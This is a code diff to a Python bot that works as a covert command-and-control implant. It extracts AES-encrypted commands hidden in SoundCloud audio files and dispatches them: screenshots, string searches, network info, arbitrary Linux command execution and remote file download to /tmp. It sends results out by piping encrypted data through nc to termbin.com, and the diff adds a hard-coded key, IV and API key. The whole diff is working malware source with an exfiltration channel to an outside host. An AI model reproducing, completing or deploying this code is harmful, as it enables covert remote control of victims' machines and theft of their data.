@@ -13,9 +13,9 @@ try:
 except ImportError as e:
     system("sudo pip install -q requests")
 
-__HASHTAGS__ = ""
-__ENC_KEY__ = ""
-__IV__ = ""
+__HASHTAGS__ = "drunk storytelling"
+__ENC_KEY__ = "CA7BB2E586B2297911228D570632B838D15FAD6776E28F09E0381A28854C02CA"
+__IV__ = "DADE575D41C4EDAFE55798C7B869C6E2"
 
 
 def encrypt(string):
@@ -26,7 +26,7 @@ def decrypt(string):
 
 class Bot:
     def __init__(self):
-        self.apiKey = ""
+        self.apiKey = "1031bab2ce2395cb86acee82de84cec0"
         self.postData = {"UID":"", "Command":"", "XfilData":"", "Time":""}
         self.oldSongs = []
 
@@ -42,7 +42,7 @@ class Bot:
         while 400 >= r.status_code <= 499:
             #API Key has been burned, need a new one
             #TODO:Create soundcloud user account to look at the buy link and get the new api key!
-            #Post to Termbin, wait hr, querry account, If new key found, set self.apiKey. Else repeat
+            #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat
 
             #This will need some refining
             r = requests.get()
@@ -73,24 +73,31 @@ class Bot:
         command_array = []
         for song in dl_array:
             r = requests.get(song)
-            #TODO: This needs Fixing real bad T_T
-            enc_command_array = re.findall('\w{30,}', r.text)
+            it = re.finditer('(00[2-7][0-9a-f]){8,}',r.text)
 
+            #Pull out every string in the .wma file
+            for obj in it:
+                enc_command_array.append(obj.group(0))
+
+        #Do command validation here
+        plaintext = []
         for command in enc_command_array:
-            plain_command = decrypt(base64.b64decode(command))
-            command_array.append(plain_command)
+            plaintext.append(decrypt(base64.b64decode(command)))
+
+        for index in xrange(len(plaintext)):
+            if plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or \
+                plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":
+
+                command_array.append(plaintext[index])
+                command_array.append(plaintext[index+1])
 
         return command_array
-
-        #Pull out all commands and their argument
-        #They will be base64 encoded aes256-cbc strings
-        #Return the plaintext array
 
 
     #Post data to termbin
     @staticmethod
     def post_data(self):
-        self.postData['Time'] = time.time()
+        self.postData['Time'] = time.ctime()
         encData = base64.b64encode(encrypt(str(self.postData)))
 
         call(['echo ' + encData + ' | nc termbin.com 9999'], shell=True)
@@ -115,12 +122,14 @@ class Bot:
     #Execute commands locally
     @staticmethod
     def rce_linux(self, command):
+        self.postData['Command'] = 'rce_linux:' + command
         self.postData['XfilData'] = check_output([command])
 
 
     #Querry website for continuous integration
     @staticmethod
     def pull_resource(self, info):
+        self.postData['Command'] = 'pull_resource'
         r = requests.get(info)
         with open('/tmp/awdf','w') as RESOURCE:
             RESOURCE.write(r.text)
